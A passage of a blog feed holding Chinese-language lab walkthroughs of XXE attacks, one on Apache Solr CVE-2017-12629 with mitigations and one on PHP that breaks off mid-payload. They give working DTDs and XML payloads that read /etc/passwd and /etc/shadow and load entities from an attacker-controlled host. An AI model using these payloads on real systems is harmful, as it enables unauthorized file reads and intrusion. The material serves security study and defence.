class=\"hljs-punctuation\">: </span>192.168.56.102:8983<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"2-构造远程-DTD-文件\"><a href=\"#2-构造远程-DTD-文件\" class=\"headerlink\" title=\"2. 构造远程 DTD 文件\"></a>2. 构造远程 DTD 文件</h3><p>由于 Solr 不回显文件内容，需通过外带攻击加载远程 DTD。</p>\n<h4 id=\"步骤：\"><a href=\"#步骤：\" class=\"headerlink\" title=\"步骤：\"></a>步骤：</h4><ol>\n<li>在 Kali（IP：<code>192.168.56.1</code>）上创建 DTD 文件 <code>test1.dtd</code>：<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dtd\">&lt;!ENTITY % passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % err &quot;&lt;!ENTITY errmsg SYSTEM &#x27;file:///etc/passwd&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>\n<strong>说明</strong>：<ul>\n<li><code>%passwd</code>：定义实体，尝试读取目标服务器的 <code>/etc/passwd</code>。</li>\n<li><code>%err</code>：嵌套实体，构造 <code>errmsg</code> 引用 <code>%passwd</code>，便于在 XML 中调用。</li>\n</ul>\n</li>\n<li>将 <code>test1.dtd</code> 放入 Kali 的 HTTP 目录（如 <code>/var/www/html/</code>）：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cp</span> test1.dtd /var/www/html/<br></code></pre></td></tr></table></figure></li>\n<li>启动 HTTP 服务：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">python3 -m http.server 80<br></code></pre></td></tr></table></figure>\n确保 DTD 可通过以下地址访问：<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dts\"><span class=\"hljs-symbol\">http:</span><span class=\"hljs-comment\">//192.168.56.1/test1.dtd</span><br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"3-构造-XML-Payload\"><a href=\"#3-构造-XML-Payload\" class=\"headerlink\" title=\"3. 构造 XML Payload\"></a>3. 构造 XML Payload</h3><p>创建以下 XML Payload，引用远程 DTD：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">root</span> [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-keyword\">remote</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;http://192.168.56.1/test1.dtd&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">  %remote;</span><br><span class=\"hljs-meta\">  %err;</span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">root</span>&gt;</span><span class=\"hljs-symbol\">&amp;errmsg;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">root</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>说明</strong>：</p>\n<ul>\n<li><code>&lt;!ENTITY % remote SYSTEM &quot;http://192.168.56.1/test1.dtd&quot;&gt;</code>：加载远程 DTD。</li>\n<li><code>%remote;</code>：执行 DTD 中的定义。</li>\n<li><code>%err;</code>：触发嵌套实体，尝试加载 <code>/etc/passwd</code>。</li>\n<li><code>&amp;errmsg;</code>：引用嵌套实体，诱导 Solr 解析。</li>\n</ul>\n<h3 id=\"4-URL-编码-Payload\"><a href=\"#4-URL-编码-Payload\" class=\"headerlink\" title=\"4. URL 编码 Payload\"></a>4. URL 编码 Payload</h3><p>由于 Payload 将通过 GET 参数 <code>q</code> 提交，需进行 URL 编码。使用 Python 脚本生成编码后的 Payload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> urllib.parse<br><br>payload = <span class=\"hljs-string\">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"hljs-string\">&lt;!DOCTYPE root [</span><br><span class=\"hljs-string\">  &lt;!ENTITY % remote SYSTEM &quot;http://192.168.56.1/test1.dtd&quot;&gt;</span><br><span class=\"hljs-string\">  %remote;</span><br><span class=\"hljs-string\">  %err;</span><br><span class=\"hljs-string\">]&gt;</span><br><span class=\"hljs-string\">&lt;root&gt;&amp;errmsg;&lt;/root&gt;&#x27;&#x27;&#x27;</span><br><br>encoded_payload = urllib.parse.quote(payload)<br><span class=\"hljs-built_in\">print</span>(encoded_payload)<br></code></pre></td></tr></table></figure>\n\n<p><strong>示例输出</strong>（部分）：</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\"><span class=\"hljs-variable\">%3</span>C<span class=\"hljs-variable\">%3</span>Fxml<span class=\"hljs-variable\">%20</span>version<span class=\"hljs-variable\">%3</span>D<span class=\"hljs-variable\">%221</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-variable\">%22</span><span class=\"hljs-variable\">%20</span>encoding<span class=\"hljs-variable\">%3</span>D<span class=\"hljs-variable\">%22</span>UTF<span class=\"hljs-number\">-8</span><span class=\"hljs-variable\">%22</span><span class=\"hljs-variable\">%3</span>F<span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%3</span>C<span class=\"hljs-title\">!DOCTYPE</span><span class=\"hljs-variable\">%20</span>root<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%5</span>B<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%3</span>C<span class=\"hljs-title\">!ENTITY</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%25</span><span class=\"hljs-variable\">%20</span>remote<span class=\"hljs-variable\">%20</span>SYSTEM<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%22</span>http<span class=\"hljs-variable\">%3</span>A<span class=\"hljs-variable\">%2</span>F<span class=\"hljs-variable\">%2</span>F<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span><span class=\"hljs-variable\">%2</span>Ftest<span class=\"hljs-number\">1</span>.dtd<span class=\"hljs-variable\">%22</span><span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%25</span>remote<span class=\"hljs-variable\">%3</span>B<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%25</span>err<span class=\"hljs-variable\">%3</span>B<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%5</span>D<span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%3</span>Croot<span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%26</span>errmsg<span class=\"hljs-variable\">%3</span>B<span class=\"hljs-variable\">%3</span>C<span class=\"hljs-variable\">%2</span>Froot<span class=\"hljs-variable\">%3</span>E<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-构造最终攻击请求\"><a href=\"#5-构造最终攻击请求\" class=\"headerlink\" title=\"5. 构造最终攻击请求\"></a>5. 构造最终攻击请求</h3><p>使用 Burp Suite 的 Repeater 模块，构造以下 GET 请求：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/solr/demo/select?q=&lt;Encoded_Payload&gt;&amp;wt=xml&amp;defType=xmlparser</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.56.102:8983<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>*/*<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br></code></pre></td></tr></table></figure>\n\n<p><strong>完整示例</strong>（替换 <code>&lt;Encoded_Payload&gt;</code> 为实际编码结果）：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">GET</span> /solr/demo/select?q=%<span class=\"hljs-number\">3</span>C%<span class=\"hljs-number\">3</span>Fxml%<span class=\"hljs-number\">20</span>version%<span class=\"hljs-number\">3</span>D%<span class=\"hljs-number\">221</span>.<span class=\"hljs-number\">0</span>%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">20</span>encoding%<span class=\"hljs-number\">3</span>D%<span class=\"hljs-number\">22</span>UTF-<span class=\"hljs-number\">8</span>%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">3</span>F%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">3</span>C!DOCTYPE%<span class=\"hljs-number\">20</span>root%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">5</span>B%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">3</span>C!ENTITY%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">25</span>%<span class=\"hljs-number\">20</span>remote%<span class=\"hljs-number\">20</span>SYSTEM%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">22</span>http%<span class=\"hljs-number\">3</span>A%<span class=\"hljs-number\">2</span>F%<span class=\"hljs-number\">2</span>F<span class=\"hljs-number\">192.168.56.1</span>%<span class=\"hljs-number\">2</span>Ftest1.dtd%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">25</span>remote%<span class=\"hljs-number\">3</span>B%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">25</span>err%<span class=\"hljs-number\">3</span>B%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">5</span>D%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">3</span>Croot%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">26</span>errmsg%<span class=\"hljs-number\">3</span>B%<span class=\"hljs-number\">3</span>C%<span class=\"hljs-number\">2</span>Froot%<span class=\"hljs-number\">3</span>E&amp;wt=xml&amp;defType=xmlparser HTTP/<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span><br><span class=\"hljs-attribute\">Host</span>: <span class=\"hljs-number\">192.168.56.102:8983</span><br><span class=\"hljs-attribute\">User</span>-Agent: Mozilla/<span class=\"hljs-number\">5</span>.<span class=\"hljs-number\">0</span> (Windows NT <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">0</span>; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span>: */*<br><span class=\"hljs-attribute\">Connection</span>: close<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-验证攻击效果\"><a href=\"#6-验证攻击效果\" class=\"headerlink\" title=\"6. 验证攻击效果\"></a>6. 验证攻击效果</h3><ol>\n<li>发送请求后，观察 Kali 的 HTTP 服务日志：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">192.168.56.102 - - [01/Aug/2025 17:52:25] <span class=\"hljs-string\">&quot;GET /test1.dtd HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>\n如果看到 Solr（<code>192.168.56.102</code>）访问了 <code>test1.dtd</code>，说明 DTD 被成功加载。</li>\n<li>由于 Solr 不回显 <code>/etc/passwd</code> 内容，攻击成功仅表现为 DTD 请求到达攻击者服务器，间接证明 XXE 触发。</li>\n</ol>\n<hr>\n<h2 id=\"六、原理深入分析\"><a href=\"#六、原理深入分析\" class=\"headerlink\" title=\"六、原理深入分析\"></a>六、原理深入分析</h2><h3 id=\"1-利用链条\"><a href=\"#1-利用链条\" class=\"headerlink\" title=\"1. 利用链条\"></a>1. 利用链条</h3><ul>\n<li><strong>用户输入</strong>：提交包含外部实体的 XML Payload。</li>\n<li><strong>Solr 解析</strong>：<code>defType=xmlparser</code> 触发 XML 解析器处理 <code>q</code> 参数。</li>\n<li><strong>加载 DTD</strong>：解析器访问远程 DTD（<code>http://192.168.56.1/test1.dtd</code>）。</li>\n<li><strong>引用文件</strong>：DTD 中的实体尝试加载本地文件（如 <code>/etc/passwd</code>）。</li>\n<li><strong>外带请求</strong>：通过嵌套实体，Solr 发起对攻击者服务器的请求，携带文件内容或触发日志。</li>\n</ul>\n<h3 id=\"2-关键点\"><a href=\"#2-关键点\" class=\"headerlink\" title=\"2. 关键点\"></a>2. 关键点</h3><ul>\n<li><strong><code>defType=xmlparser</code></strong>：启用 Solr 的 XML 解析器，是触发 XXE 的核心。</li>\n<li><strong>远程 DTD</strong>：绕过 Solr 无回显限制，通过外带技术验证文件读取。</li>\n<li><strong>嵌套实体</strong>：通过 <code>%err</code> 和 <code>&amp;errmsg;</code> 构造复杂实体链，确保文件被引用。</li>\n</ul>\n<h3 id=\"3-限制与挑战\"><a href=\"#3-限制与挑战\" class=\"headerlink\" title=\"3. 限制与挑战\"></a>3. 限制与挑战</h3><ul>\n<li><strong>无回显</strong>：需依赖外带技术，增加利用复杂度。</li>\n<li><strong>网络限制</strong>：目标服务器需允许出站 HTTP 请求，否则 DTD 无法加载。</li>\n<li><strong>DTD 构造</strong>：需要精确定义实体，避免解析错误。</li>\n</ul>\n<hr>\n<h2 id=\"七、防护建议\"><a href=\"#七、防护建议\" class=\"headerlink\" title=\"七、防护建议\"></a>七、防护建议</h2><ol>\n<li><p><strong>升级 Solr 版本</strong></p>\n<ul>\n<li>升级到 Apache Solr 7.1.0 或更高版本，官方已修复 XXE 漏洞。</li>\n<li>定期检查 Solr 更新，应用最新补丁。</li>\n</ul>\n</li>\n<li><p><strong>禁用 XML 解析器</strong></p>\n<ul>\n<li>禁用 <code>defType=xmlparser</code>，或限制对 <code>/solr/demo/select</code> 接口的访问。</li>\n<li>在 Solr 配置文件中关闭不必要的查询解析器。</li>\n</ul>\n</li>\n<li><p><strong>限制出站网络请求</strong></p>\n<ul>\n<li>配置防火墙，阻止 Solr 实例访问外部 HTTP 资源。</li>\n<li>使用网络策略（如 iptables）限制出站流量。</li>\n</ul>\n</li>\n<li><p><strong>启用 WAF</strong></p>\n<ul>\n<li>部署 Web 应用防火墙，检测包含 <code>&lt;!DOCTYPE</code> 或 <code>&lt;!ENTITY</code> 的 XML 请求。</li>\n<li>配置正则规则，拦截潜在 XXE Payload。</li>\n</ul>\n</li>\n<li><p><strong>安全编码</strong></p>\n<ul>\n<li>在开发中禁用 XML 外部实体解析，例如：<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-type\">DocumentBuilderFactory</span> <span class=\"hljs-variable\">dbf</span> <span class=\"hljs-operator\">=</span> DocumentBuilderFactory.newInstance();<br>dbf.setFeature(<span class=\"hljs-string\">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class=\"hljs-literal\">true</span>);<br></code></pre></td></tr></table></figure></li>\n<li>使用安全的 XML 解析库（如 SAX 或 DOM4J）。</li>\n</ul>\n</li>\n<li><p><strong>日志监控</strong></p>\n<ul>\n<li>定期检查 Solr 日志，关注异常的 XML 解析请求。</li>\n<li>监控出站网络流量，及时发现外带攻击。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"八、总结\"><a href=\"#八、总结\" class=\"headerlink\" title=\"八、总结\"></a>八、总结</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>漏洞编号</strong></td>\n<td>CVE-2017-12629</td>\n</tr>\n<tr>\n<td><strong>漏洞类型</strong></td>\n<td>XXE（XML 外部实体注入）</td>\n</tr>\n<tr>\n<td><strong>影响版本</strong></td>\n<td>Apache Solr &lt; 7.1.0</td>\n</tr>\n<tr>\n<td><strong>利用方式</strong></td>\n<td>远程 DTD + 外带攻击</td>\n</tr>\n<tr>\n<td><strong>关键点</strong></td>\n<td><code>defType=xmlparser</code> 触发 XML 解析</td>\n</tr>\n<tr>\n<td><strong>测试平台</strong></td>\n<td>Vulhub + Kali Linux</td>\n</tr>\n<tr>\n<td><strong>危害</strong></td>\n<td>敏感文件读取、内网探测</td>\n</tr>\n</tbody></table>\n<p>Apache Solr CVE-2017-12629 XXE 漏洞展示了 XML 解析器开放外部实体解析的严重安全隐患。虽然利用过程因无回显和网络限制较为复杂，但通过远程 DTD 和外带技术，攻击者可成功读取目标服务器的敏感文件（如 <code>/etc/passwd</code>）。开发者应及时升级 Solr 版本、禁用不安全的解析器、限制出站请求，并配合 WAF 和日志监控，构建多层次防御体系。</p>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n<p>“渗透测试的艺术在于：构造、验证、提权、保持优雅”</p>\n",
            "tags": [
                "Web安全",
                "XXE",
                "漏洞复现",
                "Solr",
                "Vulhub",
                "Kali"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/29/PHP-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/",
            "url": "https://bae-ace.github.io/2025/07/29/PHP-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/",
            "title": "PHP XXE 漏洞利用与原理",
            "date_published": "2025-07-29T06:39:23.000Z",
            "content_html": "<h1 id=\"PHP-XXE-漏洞利用与原理\"><a href=\"#PHP-XXE-漏洞利用与原理\" class=\"headerlink\" title=\"PHP XXE 漏洞利用与原理\"></a>PHP XXE 漏洞利用与原理</h1><h2 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h2><p>XML External Entity Injection（XXE）是一种针对 XML 解析器的安全漏洞，广泛存在于处理 XML 输入的 Web 应用中。PHP 应用若使用不安全的 XML 解析配置，可能导致攻击者通过构造恶意 XML 载荷读取敏感文件、发起 SSRF（服务器端请求伪造）或执行其他恶意操作。本文将详细讲解 PHP XXE 漏洞的原理、利用步骤、靶场环境搭建，以及防护建议，旨在帮助读者深入理解并有效应对此类漏洞。</p>\n<hr>\n<h2 id=\"一、XXE-漏洞简介\"><a href=\"#一、XXE-漏洞简介\" class=\"headerlink\" title=\"一、XXE 漏洞简介\"></a>一、XXE 漏洞简介</h2><p>XXE（XML External Entity Injection）漏洞发生在 XML 解析器处理外部实体时，若未正确配置，允许攻击者通过恶意 XML 输入加载外部实体，从而执行文件读取、SSRF 或其他攻击。PHP 环境中，常见于使用 <code>libxml2</code> 库（如 <code>SimpleXMLElement</code> 或 <code>DOMDocument</code>）解析 XML 时，未禁用外部实体解析。</p>\n<p><strong>危害</strong>：</p>\n<ul>\n<li>读取服务器本地文件（如 <code>/etc/passwd</code>、<code>/etc/shadow</code>）。</li>\n<li>发起 SSRF，访问内网资源。</li>\n<li>在特定条件下，可能导致拒绝服务（DoS）或远程代码执行（RCE）。</li>\n</ul>\n<hr>\n<h2 id=\"二、漏洞原理\"><a href=\"#二、漏洞原理\" class=\"headerlink\" title=\"二、漏洞原理\"></a>二、漏洞原理</h2><p>XXE 漏洞的核心在于 XML 解析器对外部实体（External Entities）的处理。XML 支持通过 <code>&lt;!ENTITY&gt;</code> 定义实体，实体可以引用本地文件或远程资源。如果解析器未限制外部实体加载，攻击者可通过以下方式触发漏洞：</p>\n<ol>\n<li><p><strong>构造恶意 XML 载荷</strong>：</p>\n<ul>\n<li><p>使用 <code>&lt;!DOCTYPE&gt;</code> 和 <code>&lt;!ENTITY&gt;</code> 定义外部实体，指向本地文件（如 <code>file:///etc/shadow</code>）或远程资源。</p>\n</li>\n<li><p>示例：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p><strong>服务器解析 XML</strong>：</p>\n<ul>\n<li>服务器使用不安全的 XML 解析器（如 PHP 的 <code>DOMDocument</code>）处理输入。</li>\n<li>解析器加载外部实体，将文件内容替换到实体引用（如 <code>&amp;aaa;</code>）。</li>\n</ul>\n</li>\n<li><p><strong>信息泄露或进一步攻击</strong>：</p>\n<ul>\n<li>解析器回显实体内容（如 <code>/etc/shadow</code>），导致敏感信息泄露。</li>\n<li>若支持远程实体，可加载攻击者控制的 DTD 文件，触发 SSRF 或更复杂攻击。</li>\n</ul>\n</li>\n</ol>\n<p><strong>关键条件</strong>：</p>\n<ul>\n<li>服务器允许外部实体解析（PHP 默认未禁用 <code>libxml2</code> 的外部实体）。</li>\n<li>应用直接处理用户提交的 XML 输入。</li>\n<li>解析结果可能被回显或以某种方式暴露。</li>\n</ul>\n<hr>\n<h2 id=\"三、靶场环境准备\"><a href=\"#三、靶场环境准备\" class=\"headerlink\" title=\"三、靶场环境准备\"></a>三、靶场环境准备</h2><p>以下是复现 PHP XXE 漏洞的环境搭建步骤，基于提供的靶场要求：</p>\n<h3 id=\"环境要求\"><a href=\"#环境要求\" class=\"headerlink\" title=\"环境要求\"></a>环境要求</h3><ul>\n<li><strong>操作系统</strong>：Kali Linux（IP：192.168.56.102，仅主机网卡）</li>\n<li><strong>靶场地址</strong>：<code>http://192.168.56.102:8080/</code></li>\n<li><strong>工具</strong>：<ul>\n<li>Burp Suite：抓包与修改 HTTP 请求</li>\n<li>Firefox 浏览器：设置代理到 Burp Suite（127.0.0.1:8080）</li>\n<li>Python HTTP 服务（可选）：托管远程 DTD 文件</li>\n</ul>\n</li>\n<li><strong>前提</strong>：已完成《php xxe漏洞靶场搭建.docx》中的搭建步骤，靶场运行正常。</li>\n</ul>\n<h3 id=\"快速验证靶场\"><a href=\"#快速验证靶场\" class=\"headerlink\" title=\"快速验证靶场\"></a>快速验证靶场</h3><ol>\n<li><p>启动靶场：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose up -d<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>确认靶场可访问：</p>\n<ul>\n<li>在 Firefox 浏览器中访问 <code>http://192.168.56.102:8080/dom.php</code>。</li>\n<li>若页面正常加载，靶场搭建成功。</li>\n</ul>\n</li>\n<li><p>配置 Burp Suite 和 Firefox：</p>\n<ul>\n<li>启动 Burp Suite，启用 Proxy 模块，默认监听 <code>127.0.0.1:8080</code>。</li>\n<li>在 Firefox 中设置手动代理，指向 <code>127.0.0.1:8080</code>。</li>\n</ul>\n</li>\n<li><p>（可选）准备远程 DTD 服务：</p>\n<ul>\n<li><p>在 Kali 上启动 Python HTTP 服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">python3 -m http.server 80<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>将 <code>test.dtd</code> 放入 HTTP 服务根目录，内容如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"四、漏洞利用步骤\"><a href=\"#四、漏洞利用步骤\" class=\"headerlink\" title=\"四、漏洞利用步骤\"></a>四、漏洞利用步骤</h2><h3 id=\"1-启动-Burp-Suite-并抓包\"><a href=\"#1-启动-Burp-Suite-并抓包\" class=\"headerlink\" title=\"1. 启动 Burp Suite 并抓包\"></a>1. 启动 Burp Suite 并抓包</h3><ul>\n<li><p>打开 Burp Suite，确认 Proxy 模块监听 <code>127.0.0.1:8080</code>。</p>\n</li>\n<li><p>在 Firefox 中访问靶场漏洞页面：<code>http://192.168.56.102:8080/dom.php</code>。</p>\n</li>\n<li><p>Burp Suite 拦截到以下 GET 请求：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/dom.php</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.56.102:8080<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class=\"hljs-attribute\">Accept-Language</span><span class=\"hljs-punctuation\">: </span>zh-CN,zh;q=0.8<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>右键点击请求，选择 “Send to Repeater” 以便后续修改。</p>\n</li>\n</ul>\n<h3 id=\"2-构造-XXE-Payload\"><a href=\"#2-构造-XXE-Payload\" class=\"headerlink\" title=\"2. 构造 XXE Payload\"></a>2. 构造 XXE Payload</h3><p>以下是两种常见的 XXE 攻击载荷：</p>\n<h4 id=\"Payload-1：读取本地文件（如-etc-shadow）\"><a href=\"#Payload-1：读取本地文件（如-etc-shadow）\" class=\"headerlink\" title=\"Payload 1：读取本地文件（如 /etc/shadow）\"></a>Payload 1：读取本地文件（如 <code>/etc/shadow</code>）</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> 